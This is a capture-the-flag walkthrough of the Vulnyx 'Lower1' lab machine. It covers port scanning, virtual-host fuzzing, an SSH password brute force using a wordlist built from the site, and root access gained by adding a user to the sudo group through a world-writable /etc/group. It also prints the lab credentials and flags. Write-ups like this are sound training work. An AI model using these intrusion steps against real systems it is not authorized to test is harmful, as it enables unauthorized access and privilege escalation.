+++
title = "Lower1 - Walkthrough"
date = "2026-10-31"
author = "nvru"
description = "Walkthrough for the Vulnyx Lower1 machine."
tags = [
  "ctf",
  "walkthrough",
  "vulnyx",
  "linux",
  "apache",
  "virtual-host",
  "password-bruteforce",
  "cewl",
  "group-writable",
  "privilege-escalation",
  "easy"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.3`

The objective was to enumerate the target, identify exposed services, gain initial access through a virtual host discovered during enumeration and a targeted password brute-force, and escalate privileges by abusing a world-writable `/etc/group` file.

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.3 -b 500 -- -sC -sV -A -oN nmap/init
```

### Results

```text
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzUvGOaZF4gJoYBGR4NrMZOj32x98uVDUQ0dY0RENRdIyokD8RvJG8g9g71aoh/20m4mcEEdSyp+eE9ABu1kwk=
|   256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPrNZ9AQg+cgX4w0wabsDTAVeo9/VWThsF5efc2OzsFo
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.unique.nyx
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two services were exposed:

- SSH on port **22**
- Apache HTTP Server on port **80**

The HTTP service became the primary attack surface.

---

## Enumeration

### HTTP Enumeration

Browsing to the target redirected all requests to `www.unique.nyx`.

![HTTP redirect](/images/vulnyx/lower1/redirec.png)

I added the hostname to `/etc/hosts`.

```bash
echo "10.10.10.3 www.unique.nyx" | sudo tee -a /etc/hosts
```

After adding the entry, the site still returned an error instead of loading properly.

![Website error](/images/vulnyx/lower1/error.png)

I then performed directory brute forcing to look for hidden content.

```bash
feroxbuster -u http://www.unique.nyx/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,html,js,bak,py,sql,xml,phtml
```

Nothing was discovered apart from the default `index.php` page, so I moved on to virtual host enumeration.

![Directory brute force](/images/vulnyx/lower1/dir_brute_nothing.png)

---

### Virtual Host Enumeration

Since the root site was not useful, I used `ffuf` to fuzz for subdomains.

```bash
ffuf -u http://unique.nyx \
  -H "Host: FUZZ.unique.nyx" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac
```

The scan identified a valid virtual host.

![Virtual host discovery](/images/vulnyx/lower1/vhost.png)

The discovered subdomain was `tech.unique.nyx`.

```bash
echo "10.10.10.3 tech.unique.nyx" | sudo tee -a /etc/hosts
```

The host loaded successfully and presented a website belonging to a tech company.

![Tech subdomain](/images/vulnyx/lower1/tech_sub.png)

---

### User Enumeration

While browsing the website, I found three names that looked like potential usernames.

![Possible users](/images/vulnyx/lower1/poss_users.png)

Instead of blindly brute-forcing with a generic wordlist, I generated a custom password list from the website content using `cewl`.

```bash
cewl -m6 "http://tech.unique.nyx/" --with-numbers > passw_cewl
```

The generated wordlist was then used with Hydra against the usernames discovered on the site.

One of the accounts was successfully compromised.

![Found lancer](/images/vulnyx/lower1/fnd_lancer.png)

---

## Initial Access

The recovered credentials were valid for SSH.

```text
lancer:NewY0rk
```

Authenticating over SSH provided an interactive shell as `lancer`.

![SSH login](/images/vulnyx/lower1/lancer_ssh.png)

---

## Privilege Escalation

### Local Enumeration

The first thing I checked was the user's sudo permissions.

```bash
sudo -l
```

No sudo permissions were available.

![No sudo](/images/vulnyx/lower1/no_sudo.png)

I also checked `doas`, which was not present or configured.

![No doas](/images/vulnyx/lower1/no_doas.png)

Enumerating accounts with valid shells showed that `lancer` was effectively the only non-root user on the box.

```bash
cat /etc/passwd | grep sh$
```

![No other users](/images/vulnyx/lower1/no_other_users.png)

I checked for scheduled tasks next.

```bash
systemctl list-timers --all
```

Nothing useful was running, so there was no obvious cron or timer-based path.

![Systemd timers](/images/vulnyx/lower1/systemd_timer.png)

A search for SUID binaries did not return anything exploitable.

```bash
find / -type f -perm -4000 2>/dev/null
```

![No SUID](/images/vulnyx/lower1/no_suid.png)

The same was true for capabilities.

```bash
/sbin/getcap -r / 2>/dev/null
```

![No capabilities](/images/vulnyx/lower1/no_cap.png)

---

### World-Writable /etc/group

I then searched for files writable by the current user.

```bash
find / -writable 2>/dev/null | grep -Ev "proc|home|sys|dev|tmp|run"
```

The search revealed that `/etc/group` was writable by everyone.

![Writable /etc/group](/images/vulnyx/lower1/etc_group.png)

`/etc/group` defines the groups on the system and the users that belong to each of them. If a regular user can modify this file, they can simply add themselves to a privileged group.

I edited the file and added `lancer` to the `sudo` group.

```bash
nano /etc/group
```

```text
sudo:x:27:lancer
```

![Added to sudo group](/images/vulnyx/lower1/sudo_add.png)

Group membership is applied when a new session is created, so I opened a fresh SSH session as `lancer`.

The new group membership was active.

```bash
sudo -l
```

```text
User lancer may run the following commands on lower1:
    (ALL : ALL) ALL
```

![sudo permissions](/images/vulnyx/lower1/all_all.png)

With full sudo rights, I escalated directly to root.

```bash
sudo -i
```

![Root shell](/images/vulnyx/lower1/root.png)

Root access was obtained.

---

## Credentials

```text
SSH
    lancer:NewY0rk
```

---

## Flags

```text
user:bbb446e708226206823f2f74b9dc540c

root:b2daf29b8bd041ea1787f345799b61b4
```
